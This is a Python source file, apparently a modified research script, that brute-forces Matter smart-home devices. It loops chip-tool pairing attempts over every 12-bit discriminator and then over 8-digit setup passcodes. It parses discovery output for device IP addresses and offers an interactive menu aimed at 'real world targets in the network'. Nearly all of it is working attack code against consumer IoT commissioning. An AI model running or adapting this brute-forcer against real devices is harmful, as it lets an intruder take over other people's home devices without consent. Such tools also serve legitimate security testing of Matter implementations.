#!/usr/bin/env python3
'''
This is a heavily modified version of Duttagupta et al's Bruteforce script with 
additional functionality dedicated to Discriminator discovery and testing against 
real world targets in the network. Works with the companion script, MatterScanBLE.py 
for discriminator discovery.
'''
import subprocess
import time
import os
import re
import sys
import numpy as np
try:
    # When run from the parent py script
    from . import MatterScanBLE as blescanner
except ImportError:
    # When run directly
    import MatterScanBLE as blescanner

MAX_DISCRIMINATOR = 4097 # Discriminator is 12 bit number with a max value of 4097
MAX_PASSCODE = 99999999 # Max 8 digit passcode/pincode
NODE_ID_TO_ASSIGN = 5      # temporary Node ID for commissioning attempts

# Regex patterns
ipv4_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
ipv6_pattern = r'([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}'

# This scan method is used for bruteforcing both the discriminator and passcode 
def chiptool_scan(discriminator,passcode=20201020,timeout_val=2,finding_disc=True,
                  chip_bin_dir="bin/"):
    chip_tool_exec = os.path.join(chip_bin_dir, "chip-tool")
    cmd = [
        chip_tool_exec,
        "pairing",
        "onnetwork-long",
        str(NODE_ID_TO_ASSIGN),
        str(passcode),
        str(discriminator),
        "--timeout",
        str(timeout_val)
    ]

    print(f"INFO - Command used is: {cmd}")

    start_time = time.time()
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=timeout_val
        )
        duration = time.time() - start_time

        # Only check if the finding_disc flag is set to True and "Discovered device"
        # is in the console output
        if "Discovered Device:" in result.stdout and finding_disc: 
            print(f"INFO - Discovered a device with the discriminator " \
                  "value {discriminator}")
            startingAddIndx = (result.stdout).index("Discovered Device:")
            addressString = result.stdout[startingAddIndx+19:startingAddIndx+35]
            match = re.search(ipv4_pattern, addressString)

            if match:
               print(f"INFO - IPV4 Address is {match.group()}")
            else:
               print(f"INFO - IPV6 Address is " 
                    "{result.stdout[startingAddIndx+19:startingAddIndx+50]}")
            # Let's break out
            return "success"

        if result.returncode == 0:
            print(f"INFO - SUCCESS (Unexpected!) - Duration: {duration:.2f}s")
            return "success"
        elif "CHIP Error 0x000000AC" in result.stderr or "CHIP Error 0x000000AC" \
            in result.stdout:
            print(f"INFO - FAIL (Wrong Passcode Error 0xAC) - Duration: {duration:.2f}s")
            return "wrong_passcode"
        elif "CHIP Error 0x00000032" in result.stderr or "CHIP Error 0x00000032" \
            in result.stdout:
            # printing chip-tool output only on timeout to see discovery details
            print(result.stderr.strip())
            print(f"INFO - FAIL (Timeout Error 0x32) - Duration: {duration:.2f}s")
            return "other_error"
        else:
            print(f"INFO - FAIL (Other Error) - Duration: {duration:.2f}s")
            return "other_error"

    except subprocess.TimeoutExpired:
        duration = time.time() - start_time
        print(f"INFO - FAIL (Command Timeout) - Duration: {duration:.2f}s")
        return "timeout"
    except FileNotFoundError:
        print(f"INFO - ERROR: chip-tool executable not found at {chip_tool_exec}", \
              file=sys.stderr)
        return "fatal"
    except Exception as e:
        print(f"INFO - FAIL (Script Exception: {e})")
        return "fatal"

# Find the discriminator with starting value, it should not exceed 4096 since the 
# discriminator is just a 12 bit value
def find_discriminator(startingIndex=1):
    print(f"INFO - Searching for Discriminator value between {startingIndex} and 4096")
    overall_start_time = time.time()

    # Try find the value between the specified starting value and up to 4097
    for i in range(startingIndex,MAX_DISCRIMINATOR):
        print(f"INFO - Iteration number is {i} going to try run the discriminator\
               Chip-Tools scan...")
        # Set the passcode to 20202020 and timeout to 1
        return_val = chiptool_scan(i,20201020,1) 
        # Attempt to bruteforce the discriminator, break the loop once we get a 
        # successful response
        if return_val == "success":  
            #break
            return i

# chip_bin_dir contains the folder for the chip-tool binary, this is required to 
def bruteforce_passcode(startingPass=1,discriminator=1,timeout=1,chip_bin_dir="bin/"):
    overall_start_time = time.time()

    # Try find the value between the specified starting value and up to 4097
    for i in range(int(startingPass),MAX_PASSCODE):
        print(f"INFO - Iteration number is {i} going to try run the discriminator\
               Chip-Tools scan...")
        # Set the passcode to 20202020 and timeout to 1
        return_val = chiptool_scan(discriminator,i,timeout,False,chip_bin_dir) 

        # Attempt to bruteforce the discriminator, break the loop once we get 
        # a successful response
        if return_val == "success":  
            duration = time.time() - overall_start_time
            print(f"INFO - The passcode is {i} with a discriminator value of \
                  {discriminator}, overall duration is {duration:.2f}s ====")
            break
        elif return_val == "timeout":
            duration = time.time() - overall_start_time
            print(f"INFO - The device is likely no longer in Commissioning phase, \
                  last attempted passcode is {i} with a discriminator value of \
                    {discriminator}, overall duration is {duration:.2f}s ====")
            break
            #return i

# Carry out selected menu action, print error message if an invalid selection is made
def get_valid_choice(prompt, valid_choices):
    while True:
        choice = input(prompt)
        if choice in valid_choices:
            return choice
        else:
            print(f"INFO - Invalid input. Please choose from \
                  {', '.join(valid_choices)}.")

def display_options(chip_bin_dir="bin/"):
    bruteforce_menu_actions = {
        '1': 'back',
        '2': 'brute with dis',
        '3': 'find dis'
    }

    while True:
        print("\nMenu:")
        print("1. Go back to main menu")
        print("2. Bruteforce with discriminator")
        print("3. Find Discriminator")
        #print("4. Continue bruteforce")
        choice = get_valid_choice("Select an option: ", \
                                  bruteforce_menu_actions.keys())
        print(f"INFO - Choice is: {choice}")
        if choice == '1': # Go back to the main menu
            print(f"INFO - Going back to main menu")
            break
        elif choice == '2':
            dis_val = input("Enter a value between 0 and 4096: ")
            if int(dis_val) > 0 and int(dis_val) < 4097:
                print(f"INFO - Valid discriminator value: {dis_val}")
                starting_passcode_val = input("Enter a value between 0 and \
                                              99999999: ")
                print(f"INFO - Valid passcode value: {starting_passcode_val}")
                # Start the next scan
                bruteforce_passcode(starting_passcode_val,dis_val,30,chip_bin_dir)
            break
        elif choice == '3':
            blescanner.initiate_scan()
            break
        elif choice == '4':
            print(f"INFO - Continue bruteforce")
            break
        else:
            break

# Allow the script to be run on its own
if __name__ == '__main__':
    display_options("../bin/")